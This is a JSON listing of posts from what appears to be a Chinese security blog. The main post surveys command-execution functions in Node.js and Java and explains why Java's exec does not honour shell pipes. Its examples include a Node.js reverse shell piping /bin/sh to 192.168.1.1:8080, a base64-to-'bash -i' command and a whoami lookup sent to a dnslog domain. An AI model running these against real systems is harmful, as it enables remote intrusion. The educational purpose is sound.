{"total":7,"pageSize":10,"pageCount":1,"data":[{"title":"RCE函数总结","slug":"rce_conclude","date":"2021-02-27T10:10:29.000Z","updated":"2021-02-27T14:30:05.521Z","comments":true,"path":"api/articles/rce_conclude.json","excerpt":"","keywords":null,"cover":"rce_conclude.assets/image-20210227220806587.png","content":"<p>最近由于面试，被面试官提到了无法回答的关于命令执行的问题，遂写此文总结各语言RCE时所碰到的函数和相关的知识点，查漏补缺，也方便自己以后使用到的时候可以快速使用。（后续可能根据积累持续更新）</p>\n<h2 id=\"nodejs\"><a class=\"markdownIt-Anchor\" href=\"#nodejs\"></a> NodeJs</h2>\n<p>nodejs的几个可用命令执行函数：</p>\n<p>child_process.spawn</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var net &#x3D; require(&quot;net&quot;),</span><br><span class=\"line\">cp &#x3D; require(&quot;child_process&quot;),</span><br><span class=\"line\">sh &#x3D; cp.spawn(&quot;&#x2F;bin&#x2F;sh&quot;, []);</span><br><span class=\"line\">var client &#x3D; new net.Socket();</span><br><span class=\"line\">client.connect(8080, &quot;192.168.1.1&quot;, function()&#123;</span><br><span class=\"line\">client.pipe(sh.stdin);</span><br><span class=\"line\">sh.stdout.pipe(client);</span><br><span class=\"line\">sh.stderr.pipe(client);</span><br></pre></td></tr></table></figure>\n<p>child_process.exec</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var exec &#x3D; require(&#39;child_process&#39;).exec; </span><br><span class=\"line\">var cmdStr &#x3D; &#39;curl http:&#x2F;&#x2F;www.weather.com.cn&#x2F;data&#x2F;sk&#x2F;101010100.html&#39;;</span><br><span class=\"line\">exec(cmdStr, function(err,stdout,stderr)&#123;</span><br><span class=\"line\">      console.log(stdout);</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n<p>child_process.execSync</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var result &#x3D; require(&#39;child_process&#39;).execSync(&#39;ls&#39;).toString();</span><br></pre></td></tr></table></figure>\n<p>child_process.execFile</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var callfile &#x3D; require(&#39;child_process&#39;); </span><br><span class=\"line\">var ip &#x3D; &#39;1.1.1.1&#39;;</span><br><span class=\"line\">var username &#x3D; &#39;test&#39;;</span><br><span class=\"line\">var password &#x3D; &#39;pwd&#39;;</span><br><span class=\"line\">var newpassword &#x3D; &#39;newpwd&#39;;</span><br><span class=\"line\"></span><br><span class=\"line\">callfile.execFile(&#39;change_password.sh&#39;,[&#39;-H&#39;, ip, &#39;-U&#39;, username, &#39;-P&#39;, password, &#39;-N&#39;, newpassword],null,function (err, stdout, stderr) &#123;</span><br><span class=\"line\">    callback(err, stdout, stderr);</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n<p>命令注入可能碰到的场景是这样的，比如程序员再拼接字符串的时候使用了eval函数：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">eval(&quot;select id from user where user&#x3D;&quot; + querystring); &#x2F;&#x2F; 此处querystring可控</span><br></pre></td></tr></table></figure>\n<p>调用命令执行函数的时候需要引入child_process模块，有以下两种方式：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">require(&#39;child_porcess&#39;).execSync(&#39;id&#39;);</span><br><span class=\"line\">global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;id&#39;);</span><br></pre></td></tr></table></figure>\n<h2 id=\"java\"><a class=\"markdownIt-Anchor\" href=\"#java\"></a> Java</h2>\n<p>常见的两种方式如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ProcessBuilder pb&#x3D;new ProcessBuilder(cmd); </span><br><span class=\"line\">pb.start();</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">Runtime.getRuntime().exec(cmd)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>下面主要讨论一下Java在命令执行中为何不能使用|,&lt;,&gt;等特殊符号，首先以Runtime.getRuntime().exec(cmd)为例来看一下java进行命令执行的机制，调试如下代码：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import java.io.*;</span><br><span class=\"line\"></span><br><span class=\"line\">public class Main &#123;</span><br><span class=\"line\">    public static void main(String[] arg) throws IOException &#123;</span><br><span class=\"line\">        String command&#x3D;&quot;&#x2F;bin&#x2F;bash -c &#123;echo,ZWNobyAxMjMgPiAxMjMudHh0Cg&#x3D;&#x3D;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;;</span><br><span class=\"line\">        Process proc &#x3D; Runtime.getRuntime().exec(command);   &#x2F;&#x2F;在此行加断点，进入exec函数</span><br><span class=\"line\">        InputStream in &#x3D; proc.getInputStream();</span><br><span class=\"line\">        BufferedReader br &#x3D; new BufferedReader(new InputStreamReader(in, &quot;UTF8&quot;));</span><br><span class=\"line\">        String line &#x3D; null;</span><br><span class=\"line\">        while((line&#x3D;br.readLine())!&#x3D;null) &#123;</span><br><span class=\"line\">            System.out.println(line);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><img src=\"rce_conclude.assets/image-20210227220806587.png\" alt=\"image-20210227220806587\" /></p>\n<p>继续进入exec函数，运行至return this.exec(cmdarray, envp, dir)这行：</p>\n<p><img src=\"rce_conclude.assets/image-20210227220918133.png\" alt=\"image-20210227220918133\" /></p>\n<p>可见，经过stringTokenizer处理后，我们输入的command变成了一个数组，通过空格分割：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[&quot;&#x2F;bin&#x2F;bash&quot;, &quot;-c&quot;, &quot;&#123;echo,ZWNobyAxMjMgPiAxMjMudHh0Cg&#x3D;&#x3D;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;]</span><br></pre></td></tr></table></figure>\n<p>这个函数是单纯通过分隔符来切割的，也就是说，假如我们输入的command是</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;bin&#x2F;bash -c &quot;echo &#96;whoami&#96;&quot;</span><br></pre></td></tr></table></figure>\n<p>其会被分割为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[&quot;&#x2F;bin&#x2F;bash&quot;, &quot;-c&quot;, &quot;\\&quot;echo&quot;, &quot;&#96;whoami&#96;\\&quot;&quot;]</span><br></pre></td></tr></table></figure>\n<p>然而，我们预期的参数其实是：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[&quot;&#x2F;bin&#x2F;bash&quot;, &quot;-c&quot;, &quot;\\&quot;echo &#96;whoami&#96;\\&quot;&quot;]</span><br></pre></td></tr></table></figure>\n<p>这里是简单提一下为什么尽量不要使用空格的原因。我们继续跟，会发现Runtime.getRuntime().exec底层其实用了ProcessBuilder（因此分析了Runtime.getRuntime也就不用再分析ProcessBuilder了）：</p>\n<p><img src=\"rce_conclude.assets/image-20210227221506116.png\" alt=\"image-20210227221506116\" /></p>\n<p>跟入start函数，一直到SecurityManager security = System.getSecurityManager();这里：</p>\n<p><img src=\"rce_conclude.assets/image-20210227221649311.png\" alt=\"image-20210227221649311\" /></p>\n<p>这个地方只是简单检查了一下arg[0]，即/bin/bash是否具有执行权限，继续跟，一直到ProcessImpl.start，然后跟start函数，一直跟到</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Process p &#x3D; new ProcessImpl(toCString(cmdarray[0]), argBlock, args.length, envBlock, envc[0], toCString(dir), std_fds, forceNullOutputStream, redirectErrorStream);</span><br></pre></td></tr></table></figure>\n<p>然后进入ProcessImpl：</p>\n<p><img src=\"rce_conclude.assets/image-20210227222240281.png\" alt=\"image-20210227222240281\" /></p>\n<p>实际上，java底层实现系统命令的机制是创建一个子进程，然后把后面的内容都当做是这个程序的参数，因此，java的命令执行机制是不能同时执行两个命令的，例如，我们想执行下面的代码：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;bin&#x2F;echo &#96;whoami&#96; &gt; 123              &#x2F;&#x2F; 这里java解析后会运行echo，然后把&#96;whoami&#96; &gt; 123都视为是echo的参数，感兴趣的可以自己运行验证一下</span><br><span class=\"line\">&#x2F;bin&#x2F;ping &#96;whoami&#96;.dnslog.com         &#x2F;&#x2F; 同上，而且&#96;whoami&#96;不会像脚本语言那里解析并执行一下</span><br><span class=\"line\">&#x2F;bin&#x2F;ls | base64 -                    &#x2F;&#x2F; 在脚本语言中|是一个管道符号，而在这里java会把|和base64和-当做是ls的三个参数</span><br></pre></td></tr></table></figure>\n<p>这些在脚本语言中的逻辑，在java的命令执行逻辑中是无法实现的。</p>\n","text":"最近由于面试，被面试官提到了无法回答的关于命令执行的问题，遂写此文总结各语言RCE时所碰到的函数和相关的知识点，查漏补缺，也方便自己以后使用到的时候可以快速使用。（后续可能根据积累持续更新） NodeJsnodejs的几个可用命令执行函数：child_process.spawn1","link":"","raw":null,"photos":[],"categories":[],"tags":[{"name":"web","slug":"web","count":3,"path":"api/tags/web.json"}]},{"title":"面试题总结（持续更新）","slug":"面试题总结","date":"2021-02-23T15:02:37.000Z","updated":"2021-02-23T15:03:39.661Z","comments":true,"path":"api/articles/面试题总结.json","excerpt":"","keywords":null,"cover":null,"content":"<h1 id=\"前言\"><a class=\"markdownIt-Anchor\" href=\"#前言\"></a> 前言</h1>\n<p>研二下学期了，大批面试来了，记录一下自己的面试过程，沉淀自己，也方便之后的朋友。</p>\n","text":" 前言研二下学期了，大批面试来了，记录一下自己的面试过程，沉淀自己，也方便之后的朋友。","link":"","raw":null,"photos":[],"categories":[],"tags":[{"name":"web","slug":"web","count":3,"path":"api/tags/web.json"}]},{"title":"Redis未授权访问","slug":"redis未授权访问","date":"2021-02-22T16:04:48.000Z","updated":"2021-02-26T02:36:00.724Z","comments":true,"path":"api/articles/redis未授权访问.json","excerpt":"<h1 id=\"nginxphpredis环境搭建\"><a class=\"markdownIt-Anchor\" href=\"#nginxphpredis环境搭建\"></a> Nginx+PHP+Redis环境搭建</h1>\n<p>环境搭建于arch，利用aur搭建的所以比较方便，系统不一样的请自行修改搭建步骤（也不难，这里记录下只是为了给下次省时间，其实主要还是改配置文件费时间，不同系统一样的）</p>","keywords":null,"cover":"https://blog.b0ring.cf/static/images/image-20210223223810960.png","content":null,"text":" Nginx+PHP+Redis环境搭建环境搭建于arch，利用aur搭建的所以比较方便，系统不一样的请自行修改搭建步骤（也不难，这里记录下只是为了给下次省时间，其实主要还是改配置文件费时间，不同系统一样的）Nginx环境搭建：1<br>yay -S nginx<br>修改配置文","link":"","raw":null,"photos":[],"categories":[],"tags":[{"name":"web","slug":"web","count":3,"path":"api/tags/web.json"}]},{"title":"攻防世界闯关记录_pwn高手进阶区","slug":"攻防世界闯关记录_pwn高手进阶区","date":"2019-10-05T07:39:49.000Z","updated":"2021-02-22T15:52:29.772Z","comments":true,"path":"api/articles/攻防世界闯关记录_pwn高手进阶区.json","excerpt":"<p><img src=\"../static/images/2019-10-02-15-11-09.png\" alt=\"\" /></p>\n<p>  开坑一时爽，一直开坑一直爽。来高手进阶区继续爽吧！</p>","keywords":null,"cover":"../static/images/2019-10-02-15-11-09.png","content":null,"text":" [Figure] ","link":"","raw":null,"photos":[],"categories":[],"tags":[{"name":"pwn","slug":"pwn","count":4,"path":"api/tags/pwn.json"}]},{"title":"湖湘杯2019两个密码题wp","slug":"湖湘杯2019两个密码题wp","date":"2019-10-05T07:39:49.000Z","updated":"2021-02-22T15:56:35.573Z","comments":true,"path":"api/articles/湖湘杯2019两个密码题wp.json","excerpt":"<h1 id=\"湖湘杯2019两个密码题wp\"><a class=\"markdownIt-Anchor\" href=\"#湖湘杯2019两个密码题wp\"></a> 湖湘杯2019两个密码题wp</h1>\n<p>  还是自己太菜的原因，这次湖湘杯只做出来4道题，然后5点的时候就放弃了去跟同学出去玩了，当时感觉进前50无望（这次湖湘杯py情况也很严重啊，可惜烽火台只报不封，挺恶心的）。不过无论如何，这次比赛还是有收获的，总结沉淀一下这两道密码学题目吧：</p>","keywords":null,"cover":null,"content":null,"text":" 湖湘杯2019两个密码题wp  还是自己太菜的原因，这次湖湘杯只做出来4道题，然后5点的时候就放弃了去跟同学出去玩了，当时感觉进前50无望（这次湖湘杯py情况也很严重啊，可惜烽火台只报不封，挺恶心的）。不过无论如何，这次比赛还是有收获的，总结沉淀一下这两道密码学题目吧： Ora","link":"","raw":null,"photos":[],"categories":[],"tags":[{"name":"pwn","slug":"pwn","count":4,"path":"api/tags/pwn.json"}]},{"title":"攻防世界闯关记录_pwn新手区","slug":"攻防世界闯关记录_pwn新手区","date":"2019-09-25T09:26:37.000Z","updated":"2021-02-22T15:52:29.772Z","comments":true,"path":"api/articles/攻防世界闯关记录_pwn新手区.json","excerpt":"<p><img src=\"../static/images/2019-10-02-15-11-09.png\" alt=\"\" /></p>\n<p>  开个新坑，记录自己刷XCTF攻防世界的pwn题，因为刚入门吧，从新手篇开始练起。这次一边做题一边写笔记和writeup，巩固一下自己学到的东西。</p>","keywords":null,"cover":"../static/images/2019-10-02-15-11-09.png","content":null,"text":" [Figure]  结语  其实新手区已经刷完一段时间了，感觉难度还好吧，基本没有很难得题目，但是非常适合新手入门做。还是学会了一些东西，比方说看到某函数就大概反应可能会怎么利用，练习了动态调试之类的。没有白付出时间吧。遗憾是还没做到堆入门的题目，期待接下来的高手区练习（已经做","link":"","raw":null,"photos":[],"categories":[],"tags":[{"name":"pwn","slug":"pwn","count":4,"path":"api/tags/pwn.json"}]},{"title":"从头复习ROP（持续更新中）","slug":"从头复习ROP","date":"2019-09-21T15:17:10.000Z","updated":"2021-02-22T15:59:39.255Z","comments":true,"path":"api/articles/从头复习ROP.json","excerpt":"<h1 id=\"从头复习rop\"><a class=\"markdownIt-Anchor\" href=\"#从头复习rop\"></a> 从头复习ROP</h1>\n<p><img src=\"../static/images/2019-10-02-15-12-47.png\" alt=\"\" /></p>\n<h2 id=\"一-前言\"><a class=\"markdownIt-Anchor\" href=\"#一-前言\"></a> 一、前言</h2>\n<p>  从考研结束就一直很浮躁，虽然在实习期间学习运用了一段时间web技术，但是新东西总是不想看，旧的东西又不断忘记。9月研究生开学，也算是新的开始了，沉下心来沉淀一些东西吧。感觉在学校的期间学习二进制是最合适的，所以潜下心来把二进制捡起来。</p>\n<p>  话不多说了，开始吧。<br />\n<br></p>","keywords":null,"cover":"../static/images/2019-10-02-15-12-47.png","content":null,"text":" 从头复习ROP [Figure]   在callme_one函数中，存在一组判断，如果a1,a2,a3参数不是分别依次等于1,2,3的话会立即退出。而这个函数并没有其他交互的输入操作，因此我们可以在之前的pwnme函数中输入足够长的内容用来构造callme_one，callme","link":"","raw":null,"photos":[],"categories":[],"tags":[{"name":"pwn","slug":"pwn","count":4,"path":"api/tags/pwn.json"}]}]}